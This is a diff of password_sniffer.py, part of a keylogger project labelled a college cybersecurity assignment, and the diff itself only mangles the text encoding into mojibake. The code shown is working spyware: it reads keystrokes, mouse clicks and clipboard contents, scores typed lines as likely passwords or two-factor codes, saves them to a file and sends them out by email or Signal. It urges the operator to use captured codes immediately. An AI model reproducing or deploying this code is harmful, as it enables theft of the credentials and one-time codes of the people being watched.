@@ -1,29 +1,29 @@
-"""
-password_sniffer.py — PART 2: Password detection engine.
+﻿"""
+password_sniffer.py â€” PART 2: Password detection engine.
 
 Monitors the keystroke stream produced by Part 1 and identifies credential
 entry using five detection scenarios.  Captured credentials are written to
-passwords_captured.txt — a SEPARATE file from the Part 1 keystroke log.
+passwords_captured.txt â€” a SEPARATE file from the Part 1 keystroke log.
 
 Detection scenarios
-───────────────────
-  Sc1  Mouse + Type + Enter   — mouse click detected before typing, then Enter
-  Sc2  Tab + Type + Enter     — Tab key used to navigate to password field
-  Sc3  Ctrl+C / Ctrl+V        — clipboard copy/paste correlated with Enter
-  Sc4  2FA numeric code       — 4–8 digit string followed by Enter
-  Sc5  Complex string         — mixed-case + digits + special chars, len ≥ 8
+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
+  Sc1  Mouse + Type + Enter   â€” mouse click detected before typing, then Enter
+  Sc2  Tab + Type + Enter     â€” Tab key used to navigate to password field
+  Sc3  Ctrl+C / Ctrl+V        â€” clipboard copy/paste correlated with Enter
+  Sc4  2FA numeric code       â€” 4â€“8 digit string followed by Enter
+  Sc5  Complex string         â€” mixed-case + digits + special chars, len â‰¥ 8
 
-Confidence scoring (0–100 %)
-─────────────────────────────
+Confidence scoring (0â€“100 %)
+â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
   Tab flow            +40 %
   Mouse click before  +20 %
   Complex string      +30 %
   Clipboard paste     +50 %
   Clipboard changed   +25 %
   2FA pattern         +35 %
-  Threshold to save   ≥ 30 %
+  Threshold to save   â‰¥ 30 %
 
-College cybersecurity assignment — run only on systems you own.
+College cybersecurity assignment â€” run only on systems you own.
 """
 
 import time
@@ -43,7 +43,7 @@ def _ts() -> str:
     return datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]
 
 
-# ─────────────────────────────────────────────────────────────────────────────
+# â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 class PasswordDetector:
     """Processes the keystroke stream and detects credential entry patterns."""
 
@@ -51,7 +51,7 @@ class PasswordDetector:
         self._running       = False
         self._lock          = threading.Lock()
 
-        # Rolling event buffer — (timestamp, key_obj, key_str)
+        # Rolling event buffer â€” (timestamp, key_obj, key_str)
         self._buf: deque    = deque(maxlen=500)
 
         # Current line (chars since last Enter)
@@ -75,7 +75,7 @@ class PasswordDetector:
         # Initialise output file
         self._init_file()
 
-    # ── Lifecycle ─────────────────────────────────────────────────────────────
+    # â”€â”€ Lifecycle â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     def start(self) -> None:
         self._running = True
@@ -87,7 +87,7 @@ class PasswordDetector:
         self._listener.daemon = True
         self._listener.start()
 
-        print(f"[PART 2] Password sniffer running — output: {config.PASSWORDS_FILE}")
+        print(f"[PART 2] Password sniffer running â€” output: {config.PASSWORDS_FILE}")
         print(f"[PART 2] Email alerts: {'ON' if config.EMAIL_ENABLED else 'OFF'}"
               f"  |  Signal alerts: {'ON' if config.SIGNAL_ENABLED else 'OFF'}")
         print("[PART 2] Watching for: Mouse+Type, Tab+Type, Ctrl+C/V, 2FA codes, complex strings")
@@ -98,7 +98,7 @@ class PasswordDetector:
         if self._listener:
             self._listener.stop()
 
-    # ── Called by main.py monkey-patch (receives Part 1 key events) ──────────
+    # â”€â”€ Called by main.py monkey-patch (receives Part 1 key events) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     def process_key(self, key) -> None:
         """Entry point used when Part 1 forwards its key events here."""
@@ -113,15 +113,15 @@ class PasswordDetector:
         with self._lock:
             self._buf.append((now, None, f"[MOUSE:{ev_str}]"))
 
-    # ── Clipboard callback ────────────────────────────────────────────────────
+    # â”€â”€ Clipboard callback â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     def _on_clipboard(self, source: str, content: str) -> None:
         self._clip_time = time.monotonic()
         self._log_event("CLIPBOARD_CAPTURE",
-                        f"Clipboard content changed — possible credential copied",
+                        f"Clipboard content changed â€” possible credential copied",
                         content[:150])
 
-    # ── Key processing ────────────────────────────────────────────────────────
+    # â”€â”€ Key processing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     def _on_key(self, key) -> None:
         if not self._running:
@@ -147,7 +147,7 @@ class PasswordDetector:
         if self._ctrl_down and hasattr(key, "char") and key.char:
             ch = key.char.lower()
             if ch == "c":
-                self._log_event("CTRL+C", "User pressed Ctrl+C — clipboard copy detected")
+                self._log_event("CTRL+C", "User pressed Ctrl+C â€” clipboard copy detected")
             elif ch == "v":
                 self._handle_ctrl_v(now)
             return
@@ -161,7 +161,7 @@ class PasswordDetector:
                 )
             return
 
-        # Enter → analyse the current line
+        # Enter â†’ analyse the current line
         if key == Key.enter:
             line_snap = list(self._line)
             self._line.clear()
@@ -183,18 +183,18 @@ class PasswordDetector:
         if key in (Key.ctrl, Key.ctrl_l, Key.ctrl_r):
             self._ctrl_down = False
 
-    # ── Ctrl+V handler ────────────────────────────────────────────────────────
+    # â”€â”€ Ctrl+V handler â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     def _handle_ctrl_v(self, now: float) -> None:
         clip = self._clip_monitor.last_content
         if clip and self._clip_time and (now - self._clip_time) < 5.0:
             self._log_event(
                 "CTRL+V_PASTE",
-                "Clipboard content pasted — possible credential paste",
+                "Clipboard content pasted â€” possible credential paste",
                 clip[:150],
             )
 
-    # ── Core analysis — called on every Enter press ───────────────────────────
+    # â”€â”€ Core analysis â€” called on every Enter press â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     def _analyse(self, line: list, now: float) -> None:
         text = "".join(line)
@@ -204,22 +204,22 @@ class PasswordDetector:
         confidence = 0
         reasons: list[str] = []
 
-        # ── Scenario 4: 2FA code ─────────────────────────────────────────────
+        # â”€â”€ Scenario 4: 2FA code â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
         if text.isdigit() and 4 <= len(text) <= 8:
             self._capture_2fa(text, now)
             return   # handled separately
 
-        # ── Scenario 2: Tab → type → Enter ───────────────────────────────────
+        # â”€â”€ Scenario 2: Tab â†’ type â†’ Enter â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
         if self._last_tab_t and (now - self._last_tab_t) < config.TAB_PASSWORD_DELAY:
             confidence += 40
             reasons.append("Tab-to-password flow (Sc2)")
 
-        # ── Scenario 1: Mouse click before typing ────────────────────────────
+        # â”€â”€ Scenario 1: Mouse click before typing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
         if self._mouse_click_recent(now, 5.0):
             confidence += 20
             reasons.append("Mouse-click before typing (Sc1)")
 
-        # ── Scenario 3: Clipboard paste ───────────────────────────────────────
+        # â”€â”€ Scenario 3: Clipboard paste â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
         clip = self._clip_monitor.last_content
         if clip and self._clip_time:
             age = now - self._clip_time
@@ -231,7 +231,7 @@ class PasswordDetector:
                     confidence += 25
                     reasons.append("Clipboard changed recently before Enter (Sc3)")
 
-        # ── Scenario 5: Complex string heuristic ─────────────────────────────
+        # â”€â”€ Scenario 5: Complex string heuristic â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
         if len(text) >= 6:
             classes = sum([
                 any(c.isupper()  for c in text),
@@ -249,17 +249,17 @@ class PasswordDetector:
         if confidence >= 30 and len(text) >= 3:
             self._capture_password(text, confidence, reasons, now)
 
-    # ── 2FA capture ───────────────────────────────────────────────────────────
+    # â”€â”€ 2FA capture â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     def _capture_2fa(self, code: str, now: float) -> None:
         ts = _ts()
         block = (
-            f"\n{'═' * 60}\n"
-            f"  [2FA CODE DETECTED — HIGH PRIORITY]\n"
+            f"\n{'â•' * 60}\n"
+            f"  [2FA CODE DETECTED â€” HIGH PRIORITY]\n"
             f"  Timestamp  : {ts}\n"
             f"  Code       : {code}\n"
-            f"  Note       : Code expires in ~5 minutes — act immediately!\n"
-            f"{'═' * 60}\n"
+            f"  Note       : Code expires in ~5 minutes â€” act immediately!\n"
+            f"{'â•' * 60}\n"
         )
         with open(config.PASSWORDS_FILE, "a", encoding="utf-8") as f:
             f.write(block)
@@ -273,7 +273,7 @@ class PasswordDetector:
             priority="high",
         )
 
-    # ── Password capture ──────────────────────────────────────────────────────
+    # â”€â”€ Password capture â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     def _capture_password(self, password: str, confidence: int,
                           reasons: list, now: float) -> None:
@@ -287,7 +287,7 @@ class PasswordDetector:
         flow = ", ".join(flow_parts) or "Unknown"
 
         block = (
-            f"\n{'═' * 60}\n"
+            f"\n{'â•' * 60}\n"
             f"  *** PASSWORD CAPTURED ***\n"
             f"  Timestamp  : {ts}\n"
             f"  Password   : {password}\n"
@@ -296,12 +296,12 @@ class PasswordDetector:
             f"  Flow       : {flow}\n"
             f"  Preceding  : {self._text_before_tab[:50] if self._text_before_tab else '(none)'}\n"
             f"  Clipboard  : {self._clip_monitor.last_content[:60] if self._clip_monitor.last_content else 'N/A'}\n"
-            f"{'═' * 60}\n"
+            f"{'â•' * 60}\n"
         )
         with open(config.PASSWORDS_FILE, "a", encoding="utf-8") as f:
             f.write(block)
 
-        print(f"[PART 2] PASSWORD captured — confidence {confidence}% — '{password[:20]}'")
+        print(f"[PART 2] PASSWORD captured â€” confidence {confidence}% â€” '{password[:20]}'")
         send_notification(
             f"Password captured ({confidence}%)",
             f"Password   : {password}\n"
@@ -311,7 +311,7 @@ class PasswordDetector:
             f"Timestamp  : {ts}",
         )
 
-    # ── Helpers ───────────────────────────────────────────────────────────────
+    # â”€â”€ Helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 
     def _mouse_click_recent(self, now: float, window: float) -> bool:
         with self._lock:
@@ -332,7 +332,8 @@ class PasswordDetector:
     def _init_file(self) -> None:
         with open(config.PASSWORDS_FILE, "w", encoding="utf-8") as f:
             f.write("=" * 60 + "\n")
-            f.write("  SENTINELKEY — PART 2: CAPTURED CREDENTIALS\n")
+            f.write("  SENTINELKEY â€” PART 2: CAPTURED CREDENTIALS\n")
             f.write(f"  Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
             f.write("  Separate from Part 1 keystroke log.\n")
             f.write("=" * 60 + "\n\n")
+
